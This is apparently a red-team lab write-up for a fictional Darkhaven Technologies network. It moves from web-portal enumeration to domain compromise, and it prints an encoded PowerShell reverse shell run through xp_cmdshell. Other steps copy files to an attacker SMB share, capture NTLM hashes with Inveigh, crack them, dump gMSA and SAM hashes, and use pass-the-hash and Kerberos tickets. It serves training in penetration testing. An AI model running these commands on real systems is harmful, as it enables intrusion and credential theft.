![](Pasted%20image%2020260408101620.png)
This is the layout for the network

# Objective and scope
Darkhaven Technologies is a networking organization based throughout the world with locations in NY, CA, Japan, and more. They have segregated their network and would like to do a Red Team engagement to see if a user is able to move throughout the different networks.

A Close Access Team has infiltrated Darkhaven Technologies and dropped a machine for you on the internal network that you can connect to through OpenVPN. This machine should allow you to see the entire global network, as it was dropped on a port that is within the global VLAN. The Close Access Team relayed information that they overheard about the Web Portal being worked on at this time.

# Target Hosts
**dc.darkhaven.tech** - 10.10.10.4
**dc02.corp.darkhaven.tech** - 10.10.10.5
**web.ext.darkhaven.local** - 10.10.10.132
**ca.ext.darkhaven.local** - 10.10.10.134
**share.ext.darhaven.local** - 10.10.10.135
**sql.ext.darkhaven.local** - 10.10.10.133
**dc.ext.darkhaven.local** - 10.10.10.136
**VPN** - 10.10.10.137

# Enumeration
From the objective and scope its giving me a hint that the web server may be my initial access vector

## web.ext.darkhaven.local

### Open ports
```python
nmap -p- --min-rate=2000 -sT web.ext.darkhaven.local -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 10:28 -0400
Nmap scan report for web.ext.darkhaven.local (10.10.10.132)
Host is up (0.094s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2107/tcp  open  msmq-mgmt
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49680/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.71 seconds
```
### Nmap
```python
nmap -p 80,139,445,2107,3389,5985 -A --min-rate=2000 -sT -Pn web.ext.darkhaven.local                          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 10:31 -0400
Nmap scan report for web.ext.darkhaven.local (10.10.10.132)
Host is up (0.094s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Darkhaven Technologies \xE2\x80\x93 Secure Network Solutions
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=EC2AMAZ-IKFPL26.ext.darkhaven.local
| Not valid before: 2026-02-26T01:17:22
|_Not valid after:  2026-08-28T01:17:22
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: DARKHAVEN
|   NetBIOS_Domain_Name: DARKHAVEN
|   NetBIOS_Computer_Name: EC2AMAZ-IKFPL26
|   DNS_Domain_Name: ext.darkhaven.local
|   DNS_Computer_Name: EC2AMAZ-IKFPL26.ext.darkhaven.local
|   DNS_Tree_Name: ext.darkhaven.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-04-08T14:32:31+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=4/8%Time=69D666C6%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# HTTP (80) - web.ext.darkhaven.local
## Feroxbuster
```python
feroxbuster -u http://web.ext.darkhaven.local/ -C 404

301      GET        2l       10w      161c http://web.ext.darkhaven.local/images => http://web.ext.darkhaven.local/images/
301      GET        2l       10w      158c http://web.ext.darkhaven.local/css => http://web.ext.darkhaven.local/css/
200      GET      931l     2345w    23449c http://web.ext.darkhaven.local/css/site.css
200      GET      363l     1058w    16821c http://web.ext.darkhaven.local/default.aspx
301      GET        2l       10w      161c http://web.ext.darkhaven.local/Images => http://web.ext.darkhaven.local/Images/
200      GET       83l      200w     3443c http://web.ext.darkhaven.local/login.aspx
200      GET      363l     1058w    16821c http://web.ext.darkhaven.local/
301      GET        2l       10w      158c http://web.ext.darkhaven.local/CSS => http://web.ext.darkhaven.local/CSS/
301      GET        2l       10w      158c http://web.ext.darkhaven.local/Css => http://web.ext.darkhaven.local/Css/
301      GET        2l       10w      161c http://web.ext.darkhaven.local/IMAGES => http://web.ext.darkhaven.local/IMAGES/
```
## Ffuf for vhosts
```python
nothing found
```
## Website functionality
Ill start by testing the `login.aspx` page

![](Pasted%20image%2020260408104021.png)
It looks like the portal is using domain credentials rather than creds that are specific to the website

There is also a `continue as guest` option

Found a user `it-helpdesk`

![1090](Pasted%20image%2020260408104246.png)
Found a user `sql_svc`

![](Pasted%20image%2020260408104502.png)
Using the search `Look up user sql_svc` i got an initial password

```python
sql_svc:SqLS3rvic3!
```
I can now validate these credentials

```python
nxc smb hosts.txt -u 'sql_svc' -p 'SqLS3rvic3!'  
SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         10.10.10.4      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\sql_svc:SqLS3rvic3! 
SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.4      445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\sql_svc:SqLS3rvic3! 
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\sql_svc:SqLS3rvic3! 
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] ext.darkhaven.local\sql_svc:SqLS3rvic3! 
Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
Since these are for a sql service account im going to use them on the SQL server

# Initial access on the SQL server

```python
impacket-mssqlclient ext.darkhaven.local/sql_svc:'SqLS3rvic3!'@sql.ext.darkhaven.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sql_svc  dbo@master)> 
```
I now have access to the database

## xp_cmdshell
```python
SQL (sql_svc  dbo@master)> xp_cmdshell whoami
output                
-------------------   
nt authority\system   
NULL                  
SQL (sql_svc  dbo@master)> 
```
`xp_cmdshell` is enabled which means i can get remote code execution

## Reverse shell as `nt authority system`
```python
nc -lnvp 1337
```

```python
SQL (sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMQAxAC4AMgAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```
Ive used a payload from revshells.com

```python
nc -lnvp 1337                                           
listening on [any] 1337 ...
connect to [192.168.211.2] from (UNKNOWN) [10.10.10.133] 63991
whoami
nt authority\system
PS C:\Windows\System32> 
```
Now i have shell access on the system

```python
PS C:\stored_passwords> dir


    Directory: C:\stored_passwords


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         2/27/2026   2:12 PM           2782 it_passwords.kdbx                                                    
-a----         2/27/2026   2:14 PM            956 README.txt                                                           


PS C:\stored_passwords>
```
Ill transfer these files to my machine 

```python
sudo impacket-smbserver share $(pwd) -smb2support -username hacker -password hackme
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```
This setup an SMB server

```python
PS C:\stored_passwords> net use Z: \\192.168.211.2\share /user:hacker hackme
The command completed successfully.

PS C:\stored_passwords> Copy-Item .\it_passwords.kdbx Z:\
PS C:\stored_passwords> Copy-Item .\README.txt Z:\
```
This tranferred all the files to my machine

```python
cat README.txt                                                                    
Darkhaven Technologies - IT Department Password Store
======================================================
File   : it_passwords.kdbx
Format : KeePass 2.x

Contents:
  - Network Infrastructure
      > Core Switch (sw-core-01)
      > Firewall Admin (fw-ext-01)
      > Out-of-Band Management (OOBM)
  - Servers
      > Domain Controller (dc.ext.darkhaven.local)
      > SQL Server (sql.ext.darkhaven.local)
      > Backup Server (bkp-01.ext.darkhaven.local)
  - Service Accounts
      > sql_svc           (SQL Server service account)
      > svc_backup        (Veeam Backup)
      > svc_monitoring    (SCOM data collector)
      > svc_webpool       (IIS application pool)
      > svc_sccm          (SCCM network access)
  - Cloud / SaaS
      > Azure Portal
      > Microsoft 365 Admin Center
      > Cloudflare DNS

IMPORTANT: Do not copy outside the management VLAN.
Access requests: it-security@darkhaven.local

Master Password: D@rkhav3n_IT_2024!
```
Ive got the master password so it saves me having to crack it!

![832](Pasted%20image%2020260408114454.png)
There are quite a few passwords in here so ill put them all in a file

```python
admin:Sw!tch@C0re2024
fwadmin:F!r3w@ll_Ext_2024
vpnadmin:Gl0b@lC0nn3ct#VPN
DARKHAVEN\svc_backup:V33mB@ckup#2024
DARKHAVEN\Administrator:D@rkhav3n_DSRM_2024!
sa:Darkhav3n_SA_2024!
DARKHAVEN\Administrator:Welcome1@DarkH4ven
sql_svc:SqLS3rvic3!
svc_backup:V33mB@ckup#2024
svc_webpool:W3bP00l!
showard:5rtfgvb^RTFGVB
```
This is everything from the keepass file

# Access as `showard` on `dc.ext.darkhaven.local`
```python
nxc smb dc.ext.darkhaven.local -u 'showard' -p '5rtfgvb^RTFGVB'                      
SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\showard:5rtfgvb^RTFGVB
```
This user is now compromised

I have tested my access on SMB on all the hosts, `share.ext.darkhaven.local` seems the most interesting

```python
cat Runbooks/Core_Switch_Backup_Procedure.txt                                     
DARKHAVEN TECHNOLOGIES
Core Switch Configuration Backup Procedure
Author: K. Warren | Last Updated: November 8, 2024

AUTOMATED BACKUPS
-----------------
Run nightly at 02:00 via svc_netops on share.ext.darkhaven.local.
Configs saved to: C:\DarkhavenData\IT\Systems\Backups\
Uses TFTP to pull running-config from each device.

MANUAL PROCEDURE
----------------
1. SSH to sw-core-01 (10.10.10.250)
   Credentials: see Network Infrastructure Runbook section 4

2. Copy running-config to TFTP:
   sw-core-01# copy running-config tftp://10.10.10.135/sw-core-01.cfg

3. Verify arrival at C:\DarkhavenData\IT\Systems\Backups\

4. Repeat for sw-core-02 (10.10.10.249) and firewall pair

RETENTION
---------
Weekly  : 90 days
Monthly : 2 years
Pre-change snapshots: indefinite
```
I have downloaded everything from the `DarkHavenData` share

This file says there is a nightly backup running as the `svc_netops` user 

It also give me the path it saves to

```python
cat Runbooks/Network_Infrastructure_Runbook_v3.txt 

========================================================
4. ACCESS CREDENTIALS
========================================================
IMPORTANT: For break-glass and provisioning use only.
Standard access uses individual AD accounts with MFA enforced.
Rotate all credentials per the 90-day schedule.
Last rotation: January 14, 2025.

-- FIREWALL MANAGEMENT --
  fw-ext-01 and fw-ext-02
  URL       : https://10.10.10.254
  Username  : fwadmin
  Password  : PAN_F!r3w@ll2024#ext
  API Key   : LUFRPT1BYTVpWmVwR3pXdWVQYnVRPT0= (expires 2025-06-30)

-- CORE SWITCHES --
  sw-core-01 and sw-core-02  (SSH port 22)
  Username  : netadmin
  Password  : C!sc0_C0r3$witch24
  Enable    : En@bl3_C0r3!2024

-- ACCESS SWITCHES (all units) --
  Username  : switchadmin
  Password  : Acc3ss$W1tch_24!
  Enable    : En@bl3Acc3ss!

-- NETWORK MONITORING (PRTG) --
  URL       : https://10.10.20.100:8443
  Username  : prtgadmin
  Password  : PRTG_M0n!t0r@2024

-- OUT-OF-BAND MANAGEMENT (OOBM) --
  URL       : https://10.10.10.240:8443
  Username  : oobm_admin
  Password  : 00BM_K0ns0le#2024

-- VPN GATEWAY --
  URL       : https://vpn.ext.darkhaven.local
  Username  : vpnadmin
  Password  : VPN_G@t3way$2024!

-- WIRELESS CONTROLLERS --
  URL           : https://10.10.20.200
  Username      : wifiadmin
  Password      : W1F!_C0ntr0ll3r#24
  Corp SSID PSK : DH_C0rp_W!F!_2024
  Guest SSID PSK: DH_Gu3st_2024!

-- NETWORK PROVISIONING SERVICE ACCOUNT --
  Host      : share.ext.darkhaven.local (10.10.10.135)
  Username  : svc_netops
  Password  : N3t0ps$Svc_2024!
  Role      : Local Administrator on share server
  Purpose   : Automated network configuration backup scripts
              Runs nightly at 02:00 to pull switch/FW configs via TFTP
```
Found a load of credentials

```python
svc_netops:N3t0ps$Svc_2024!
```
I will test these credentials 

# Compromising `svc_netops` on `share.ext.darkhaven.local`

![1043](Pasted%20image%2020260408124044.png)
These credentials got me access to the `share` server via RDP

![587](Pasted%20image%2020260408125154.png)
Found a wordlist which could contain passwords of some users

![](Pasted%20image%2020260408125339.png)
Since i am a local admin i am able to spawn a administrator session so now i can get another flag

Remembering the backup procedure i already know there is a process where users connect to a SMB share i might be able to intercept NTLM hashes

I can do this with inveigh

## Using inveigh to capture NTLM hashes
```python
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
This is hosting inveigh on my machine

```python
PS C:\Users\svc_netops\Documents> wget http://192.168.211.2:8000/Inveigh.exe -o inveigh.exe
PS C:\Users\svc_netops\Documents> dir


    Directory: C:\Users\svc_netops\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/8/2026   5:00 PM       14520681 inveigh.exe


PS C:\Users\svc_netops\Documents>
```
This tranferred it to the target

```python
PS C:\Users\svc_netops\Documents> ./inveigh.exe
[*] Inveigh 2.0.12 [Started 2026-04-08T17:03:01 | PID 4740]
[+] Packet Sniffer Addresses [IP 10.10.10.135 | IPv6 fe80::4ce1:8e67:5e63:90ac%3]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 10.10.10.135 | IPv6 fe80::4ce1:8e67:5e63:90ac%3]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Users\svc_netops\Documents]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[.] [17:03:17] TCP(445) SYN packet from 10.10.10.132:53777
[.] [17:03:17] SMB1(445) negotiation request detected from 10.10.10.132:53777
[.] [17:03:17] SMB2+(445) negotiation request detected from 10.10.10.132:53777
[+] [17:03:17] SMB(445) NTLM challenge [F183554159AB8EDD] sent to 10.10.10.135:53777
[+] [17:03:17] SMB(445) NTLMv2 captured for [EC2AMAZ-IKFPL26\svc_webpool] from 10.10.10.132(EC2AMAZ-IKFPL26):53777:
svc_webpool::EC2AMAZ-IKFPL26:F183554159AB8EDD:DBBE87BCAF1F8E2C5FBC704B4BC35245:0101000000000000F0FA429879C7DC01EFED8D004E206D2500000000020012004400410052004B0048004100560045004E0001000A0053004800410052004500040026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0003003200730068006100720065002E006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C00050026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0007000800F0FA429879C7DC0106000400020000000800300030000000000000000000000000300000078B9E06F4ADD88F1FC47C5DAF96AFE83E05BFC550C86CFE5173879BD7B377ED0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330035000000000000000000
[!] [17:03:17] SMB(445) NTLMv2 for [EC2AMAZ-IKFPL26\svc_webpool] written to Inveigh-NTLMv2.txt
```
Running inveigh then waiting i have captured a hash for `svc_webpool`

## Cracking the hash for `svc_webpool`
```python
hashcat svc_webpool.hash it_security_wordlist.txt

SVC_WEBPOOL::EC2AMAZ-IKFPL26:f183554159ab8edd:dbbe87bcaf1f8e2c5fbc704b4bc35245:0101000000000000f0fa429879c7dc01efed8d004e206d2500000000020012004400410052004b0048004100560045004e0001000a0053004800410052004500040026006500780074002e006400610072006b0068006100760065006e002e006c006f00630061006c0003003200730068006100720065002e006500780074002e006400610072006b0068006100760065006e002e006c006f00630061006c00050026006500780074002e006400610072006b0068006100760065006e002e006c006f00630061006c0007000800f0fa429879c7dc0106000400020000000800300030000000000000000000000000300000078b9e06f4add88f1fc47c5daf96afe83e05bfc550c86cfe5173879bd7b377ed0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310030002e003100330035000000000000000000:D@rkH@v3n128!
```
I have cracked the hash using this wordlist after the initial attempt with rockyou failed

```python
svc_webpool:D@rkH@v3n128!
```


# Compromising `svc_webpool` on `web.ext.darkhaven.local`
```python
nxc smb web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
```
Since this is a web user i wanted to try auth here and here i am a local admin so i can get another flag

I will get an RDP session as this user

![549](Pasted%20image%2020260408132616.png)
Found credentials of the `kwarren` user here at the path `C:\Users\Administrator\AppData\Roaming\Notepad++\backup`

```python
kwarren:!@#darkhav3n123#@!
```

# Bloodhound
Now is a good time to get bloodhound data, to do this ill get a winrm session as `svc_webpool`

Ill use sharphound and upload it via winrm then collect the data

![](Pasted%20image%2020260408145028.png)
I have ReadGMSAPassword on the account `ca_svc_account$`

# Dumping gMSA password of `ca_svc_account$`
```python
nxc ldap dc.ext.darkhaven.local -u kwarren -p '!@#darkhav3n123#@!' --gmsa
LDAP        10.10.10.136    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:ext.darkhaven.local) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.10.10.136    389    DC               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@! 
LDAP        10.10.10.136    389    DC               [*] Getting GMSA Passwords
LDAP        10.10.10.136    389    DC               Account: ca_svc_account$      NTLM: 3ab7add8db852831e7299c61ba35e2d2     PrincipalsAllowedToReadPassword: GRP-gMSA-ca_svc_account-Readers
```
I now have the NTLM of the `ca_svc_account$`

```python
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' --sam   
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
SMB         10.10.10.134    445    CA               [*] Dumping SAM hashes
SMB         10.10.10.134    445    CA               Administrator:500:aad3b435b51404eeaad3b435b51404ee:7af69f428fd21312a225c74e5f574ed6:::
SMB         10.10.10.134    445    CA               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.134    445    CA               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.134    445    CA               WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
SMB         10.10.10.134    445    CA               ca_svc_account$:1000:aad3b435b51404eeaad3b435b51404ee:d825d33332279362b7c3e6ba121aa570:::
SMB         10.10.10.134    445    CA               [+] Added 5 SAM hashes to the database
```

## Evil-winrm access as `Administrator` on `ca.ext.darkhaven.local`
```python
evil-winrm -i ca.ext.darkhaven.local -u Administrator -H '7af69f428fd21312a225c74e5f574ed6'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
I am now Administrator on the CA server

# Powershell history leads to user compromise of `ldap_svc`
```python
*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> type ConsoleHost_history.txt
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$localLog = "C:\Temp\network_health_$timestamp.txt"
$ping = Test-Connection -ComputerName $device.IP -Count 2 -Quiet`
$tcp22 = Test-NetConnection -ComputerName $device.IP -Port 22 -InformationLevel Quiet`
Write-Host "Health check complete. Preparing to upload log..."
net use \\dc01\share /user:ldap_svc 6trfgvb**hs#@jskKFHJAh34
net use \\dc01\share /delete
echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net user "ca_svc_account$" "RTGHs82358sUFU*$%*&#jskj"
```

Ive found two sets of credentials

```python
ldap_svc:6trfgvb**hs#@jskKFHJAh34
ca_svc_account$:RTGHs82358sUFU*$%*&#jskj
```
The CA service account is not as important here since its already compromised

But the `ldap_svc` account is a nice finding

```python
nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' --smb-timeout 30
SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         10.10.10.136    445    DC               [-] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 STATUS_ACCOUNT_RESTRICTION
```
So if i set a timeout i get an account restriction error, to get around this i can use kerberos auth

```python
nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k              
SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
```
Using kerberos auth i see the user is compromised

```python
nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k --generate-tgt ldap_svc
SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
SMB         dc.ext.darkhaven.local 445    DC               [+] TGT saved to: ldap_svc.ccache
SMB         dc.ext.darkhaven.local 445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=ldap_svc.ccache
```
To make things easier ill generate a TGT for the user 


## Evil-winrm as `ldap_svc` on `dc.ext.darkhaven.local`
```python
nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k --generate-krb5-file krb5.conf
SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         dc.ext.darkhaven.local 445    DC               [+] krb5 conf saved to: krb5.conf
SMB         dc.ext.darkhaven.local 445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
```


```python
sudo cp krb5.conf /etc/krb5.conf
```

```python
KRB5CCNAME=ldap_svc.ccache evil-winrm -i dc.ext.darkhaven.local -r ext.darkhaven.local 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ldap_svc\Documents> 
```